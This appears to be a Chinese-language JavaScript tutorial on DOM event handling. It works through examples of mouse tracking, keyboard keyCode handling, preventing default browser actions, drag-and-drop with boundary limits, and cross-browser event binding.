<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	</div><div class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</div><div class="line">	oDiv.style.top=oEvent.clientY+scrollTop+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="获取鼠标在页面的绝对位置"><a href="#获取鼠标在页面的绝对位置" class="headerlink" title="获取鼠标在页面的绝对位置"></a>获取鼠标在页面的绝对位置</h3><h4 id="封装函数"><a href="#封装函数" class="headerlink" title="封装函数"></a>封装函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line">//封装函数</div><div class="line">function getPos(ev)</div><div class="line">&#123;</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;</div><div class="line">	</div><div class="line">	return &#123;x: ev.clientX+scrollLeft, y: ev.clientY+scrollTop&#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var pos=getPos(oEvent);</div><div class="line">	</div><div class="line">	oDiv.style.left=pos.x+&apos;px&apos;;</div><div class="line">	oDiv.style.top=pos.y+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h4 id="例子2：一串跟随鼠标的Div"><a href="#例子2：一串跟随鼠标的Div" class="headerlink" title="例子2：一串跟随鼠标的Div"></a>例子2：一串跟随鼠标的Div</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">div &#123;width:10px; height:10px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line"></div><div class="line">function getPos(ev)</div><div class="line">&#123;</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;</div><div class="line">	</div><div class="line">	return &#123;x: ev.clientX+scrollLeft, y: ev.clientY+scrollTop&#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	var pos=getPos(oEvent);</div><div class="line">	</div><div class="line">	for(var i=aDiv.length-1;i&gt;0;i--)</div><div class="line">	&#123;</div><div class="line">		aDiv[i].style.left=aDiv[i-1].offsetLeft+&apos;px&apos;;</div><div class="line">		aDiv[i].style.top=aDiv[i-1].offsetTop+&apos;px&apos;;   //后一个等于前一个的位置</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	aDiv[0].style.left=pos.x+&apos;px&apos;;</div><div class="line">	aDiv[0].style.top=pos.y+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><h3 id="keyCode"><a href="#keyCode" class="headerlink" title="keyCode"></a>keyCode</h3><ul>
<li>获取用户按下键盘的哪个按键</li>
<li>onkeydown–按下</li>
<li>onkeyup–抬起</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">document.onkeydown=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	alert(oEvent.keyCode);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="例子：键盘控制Div移动"><a href="#例子：键盘控制Div移动" class="headerlink" title="例子：键盘控制Div移动"></a>例子：键盘控制Div移动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:100px; height:100px; background:#CCC; position:absolute;&#125;</div><div class="line"></div><div class="line">document.onkeydown=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	if(oEvent.keyCode==37)</div><div class="line">	&#123;</div><div class="line">		oDiv.style.left=oDiv.offsetLeft-10+&apos;px&apos;;</div><div class="line">	&#125;</div><div class="line">	else if(oEvent.keyCode==39)</div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		oDiv.style.left=oDiv.offsetLeft+10+&apos;px&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a>其他属性</h3><h4 id="ctrlKey、shiftKey、altKey"><a href="#ctrlKey、shiftKey、altKey" class="headerlink" title="ctrlKey、shiftKey、altKey"></a>ctrlKey、shiftKey、altKey</h4><h4 id="例子：提交留言"><a href="#例子：提交留言" class="headerlink" title="例子：提交留言"></a>例子：提交留言</h4><ul>
<li>回车 提交</li>
<li>ctrl+回车 提交<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTxt1=document.getElementById(&apos;txt1&apos;);</div><div class="line">	var oTxt2=document.getElementById(&apos;txt2&apos;);</div><div class="line">	</div><div class="line">	oTxt1.onkeydown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		if(oEvent.keyCode==13 &amp;&amp; oEvent.ctrlKey)</div><div class="line">		&#123;</div><div class="line">			oTxt2.value+=oTxt1.value+&apos;\n&apos;;</div><div class="line">			oTxt1.value=&apos;&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;1input id=&quot;txt1&quot; type=&quot;text&quot; /&gt;&lt;br&gt;</div><div class="line">&lt;1textarea id=&quot;txt2&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="JS事件中级"><a href="#JS事件中级" class="headerlink" title="JS事件中级"></a>JS事件中级</h1><h2 id="默认行为"><a href="#默认行为" class="headerlink" title="默认行为"></a>默认行为</h2><h3 id="默认行为-1"><a href="#默认行为-1" class="headerlink" title="默认行为"></a>默认行为</h3><ul>
<li>浏览器自带的行为就是默认行为</li>
</ul>
<h3 id="阻止默认行为"><a href="#阻止默认行为" class="headerlink" title="阻止默认行为"></a>阻止默认行为</h3><ul>
<li>普通写法：return flase;</li>
</ul>
<h4 id="例子1-屏蔽右键菜单"><a href="#例子1-屏蔽右键菜单" class="headerlink" title="例子1.屏蔽右键菜单"></a>例子1.屏蔽右键菜单</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">document.oncontextmenu=function ()</div><div class="line">&#123;</div><div class="line">	return false;	//阻止默认事件</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ul>
<li>自定义右键菜单<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">* &#123;margin:0; padding:0; list-style:none;&#125;</div><div class="line">#div1 &#123;position:absolute; width:80px; background:#CCC; border:1px solid black; display:none;&#125;</div><div class="line"></div><div class="line">document.oncontextmenu=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.display=&apos;block&apos;;</div><div class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</div><div class="line">	oDiv.style.top=oEvent.clientY+&apos;px&apos;;</div><div class="line">	</div><div class="line">	return false;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">document.onclick=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.display=&apos;none&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;</div><div class="line">	&lt;ul&gt;</div><div class="line">    	&lt;li&gt;aaa&lt;/li&gt;</div><div class="line">    	&lt;li&gt;bbb&lt;/li&gt;</div><div class="line">    	&lt;li&gt;ccc&lt;/li&gt;</div><div class="line">    	&lt;li&gt;ddd&lt;/li&gt;</div><div class="line">    &lt;/ul&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="例子2-只能输入数字的输入框"><a href="#例子2-只能输入数字的输入框" class="headerlink" title="例子2.只能输入数字的输入框"></a>例子2.只能输入数字的输入框</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	</div><div class="line">	oTxt.onkeydown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		//alert(oEvent.keyCode);</div><div class="line">		</div><div class="line">		//0-	48</div><div class="line">		//9-	57</div><div class="line">		</div><div class="line">		//如果 用户按的 不是退格 并且 也不是数字</div><div class="line">		</div><div class="line">		if(oEvent.keyCode!=8 &amp;&amp; (oEvent.keyCode&lt;48 || oEvent.keyCode&gt;57))</div><div class="line">		&#123;</div><div class="line">			return false;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;1input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;</div></pre></td></tr></table></figure>
<h4 id="附-KeyCode对照表"><a href="#附-KeyCode对照表" class="headerlink" title="附 KeyCode对照表"></a>附 KeyCode对照表</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/1.jpg" alt="javascript"><br><img src="http://obr4sfdq7.bkt.clouddn.com/2.jpg" alt="javascript"><br><img src="http://obr4sfdq7.bkt.clouddn.com/3.jpg" alt="javascript"><br><img src="http://obr4sfdq7.bkt.clouddn.com/4.jpg" alt="javascript"></p>
<h2 id="拖拽"><a href="#拖拽" class="headerlink" title="拖拽"></a>拖拽</h2><h3 id="简易拖拽"><a href="#简易拖拽" class="headerlink" title="简易拖拽"></a>简易拖拽</h3><ul>
<li>拖拽原理:鼠标与Div的距离不变，鼠标事件（onmousemove、onmousedown、onmouseup）<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	var disY=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">		disY=oEvent.clientY-oDiv.offsetTop;</div><div class="line">		</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			</div><div class="line">			oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</div><div class="line">			oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;   //鼠标抬起时，div不能再移动</div><div class="line">			document.onmouseup=null;   	</div><div class="line">		&#125;;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="靠谱拖拽"><a href="#靠谱拖拽" class="headerlink" title="靠谱拖拽"></a>靠谱拖拽</h3><h4 id="原有拖拽的问题"><a href="#原有拖拽的问题" class="headerlink" title="原有拖拽的问题"></a>原有拖拽的问题</h4><ul>
<li>直接给document加事件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</div><div class="line">	oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">document.onmouseup=function ()</div><div class="line">&#123;</div><div class="line">	document.onmousemove=null;</div><div class="line">	document.onmouseup=null;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="FF下，空Div拖拽Bug"><a href="#FF下，空Div拖拽Bug" class="headerlink" title="FF下，空Div拖拽Bug"></a>FF下，空Div拖拽Bug</h4><ul>
<li>阻止默认事件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">oDiv.onmousedown=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">	disY=oEvent.clientY-oDiv.offsetTop;</div><div class="line">	</div><div class="line">	document.onmousemove=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</div><div class="line">		oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	document.onmouseup=function ()</div><div class="line">	&#123;</div><div class="line">		document.onmousemove=null;</div><div class="line">		document.onmouseup=null;</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	return false;  //阻止默认事件</div><div class="line">&#125;;  //拖拽从onmousedown开始</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="防止拖出页面"><a href="#防止拖出页面" class="headerlink" title="防止拖出页面"></a>防止拖出页面</h4><ul>
<li>修正位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	var disY=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">		disY=oEvent.clientY-oDiv.offsetTop;</div><div class="line">		</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			var t=oEvent.clientY-disY;</div><div class="line">			</div><div class="line">			if(l&lt;0)  //小于0时直接等于0</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;document.documentElement.clientWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=document.documentElement.clientWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			if(t&lt;0)   同理</div><div class="line">			&#123;</div><div class="line">				t=0;</div><div class="line">			&#125;</div><div class="line">			else if(t&gt;document.documentElement.clientHeight-oDiv.offsetHeight)</div><div class="line">			&#123;</div><div class="line">				t=document.documentElement.clientHeight-oDiv.offsetHeight;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			oDiv.style.top=t+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h1 id="JS事件高级应用"><a href="#JS事件高级应用" class="headerlink" title="JS事件高级应用"></a>JS事件高级应用</h1><h2 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h2><h3 id="IE方式"><a href="#IE方式" class="headerlink" title="IE方式"></a>IE方式</h3><ul>
<li>attachEvent(事件名称, 函数)，绑定事件处理函数   事件名带on</li>
<li>detachEvent(事件名称, 函数)，解除绑定<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//attachEvent(事件名， 函数)</div><div class="line">//IE</div><div class="line">/*</div><div class="line">oBtn.attachEvent(&apos;onclick&apos;, function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;a&apos;);</div><div class="line">&#125;);</div><div class="line">oBtn.attachEvent(&apos;onclick&apos;, function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;b&apos;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="DOM-方式"><a href="#DOM-方式" class="headerlink" title="DOM 方式"></a>DOM 方式</h3><ul>
<li>addEventListener(事件名, 函数, false)  事件名不带on</li>
<li>removeEventListener(事件名称, 函数, 捕获)</li>
</ul>
<h4 id="火狐方式"><a href="#火狐方式" class="headerlink" title="火狐方式"></a>火狐方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//FF</div><div class="line">//addEventListener(事件名, 函数, false)</div><div class="line">oBtn.addEventListener(&apos;click&apos;, function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;a&apos;);</div><div class="line">&#125;, false);</div><div class="line">oBtn.addEventListener(&apos;click&apos;, function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;b&apos;);</div><div class="line">&#125;, false);</div></pre></td></tr></table></figure>
<h4 id="兼容火狐、IE"><a href="#兼容火狐、IE" class="headerlink" title="兼容火狐、IE"></a>兼容火狐、IE</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">if(oBtn.attachEvent)</div><div class="line">&#123;</div><div class="line">	oBtn.attachEvent(&apos;onclick&apos;, function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;a&apos;);</div><div class="line">	&#125;);</div><div class="line">	oBtn.attachEvent(&apos;onclick&apos;, function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;b&apos;);</div><div class="line">	&#125;);</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	oBtn.addEventListener(&apos;click&apos;, function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;a&apos;);</div><div class="line">	&#125;, false);</div><div class="line">	oBtn.addEventListener(&apos;click&apos;, function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;b&apos;);</div><div class="line">	&#125;, false);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="兼容封装函数"><a href="#兼容封装函数" class="headerlink" title="兼容封装函数"></a>兼容封装函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function myAddEvent(obj, ev, fn)</div><div class="line">&#123;</div><div class="line">	if(obj.attachEvent)</div><div class="line">	&#123;</div><div class="line">		obj.attachEvent(&apos;on&apos;+ev, fn);</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		obj.addEventListener(ev, fn, false);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	myAddEvent(oBtn, &apos;click&apos;, function ()&#123;</div><div class="line">		alert(&apos;a&apos;);</div><div class="line">	&#125;);</div><div class="line">	</div><div class="line">	myAddEvent(oBtn, &apos;click&apos;, function ()&#123;</div><div class="line">		alert(&apos;b&apos;);</div><div class="line">	&#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="高级拖拽-1"><a href="#高级拖拽-1" class="headerlink" title="高级拖拽-1"></a>高级拖拽-1</h2><h3 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h3><h4 id="对位置进行判断"><a href="#对位置进行判断" class="headerlink" title="对位置进行判断"></a>对位置进行判断</h4><ul>
<li>例子：不能拖出指定对象的Div<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var l=oEvent.clientX-disX;</div><div class="line">	var t=oEvent.clientY-disY;</div><div class="line">	</div><div class="line">	if(l&lt;0)</div><div class="line">	&#123;</div><div class="line">		l=0;</div><div class="line">	&#125;</div><div class="line">	else if(l&gt;oDiv2.offsetWidth-oDiv.offsetWidth)  //限制范围时用到div的宽度</div><div class="line">	&#123;</div><div class="line">		l=oDiv2.offsetWidth-oDiv.offsetWidth;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	if(t&lt;0)</div><div class="line">	&#123;</div><div class="line">		t=0;</div><div class="line">	&#125;</div><div class="line">	else if(t&gt;oDiv2.offsetHeight-oDiv.offsetHeight)</div><div class="line">	&#123;</div><div class="line">		t=oDiv2.offsetHeight-oDiv.offsetHeight;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	oDiv.style.left=l+&apos;px&apos;;</div><div class="line">	oDiv.style.top=t+&apos;px&apos;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
